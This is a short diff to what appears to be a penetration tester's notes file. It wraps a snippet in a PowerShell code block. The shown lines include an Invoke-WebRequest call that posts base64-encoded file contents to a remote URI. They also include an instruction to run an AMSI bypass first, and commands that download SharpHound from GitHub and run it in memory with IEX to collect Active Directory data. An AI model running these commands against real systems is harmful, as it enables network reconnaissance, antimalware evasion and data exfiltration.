@@ -28,9 +28,11 @@ Invoke-WebRequest -uri $uri -Method Post -Body $base64
 Use https://base64.guru/converter/decode/file#download-preview-file to get the file from the base64 content
 
 bloodhound:
+```powershell
 # FIRST run AMSI bypass! 
 $url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
 IEX([Net.Webclient]::new().DownloadString($url))
 mkdir "$Env:PUBLIC\bloodhound"
 Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default  -OutputDirectory "$Env:PUBLIC\bloodhound"
 # use file/pdf extraction to get the zip file. 
+```
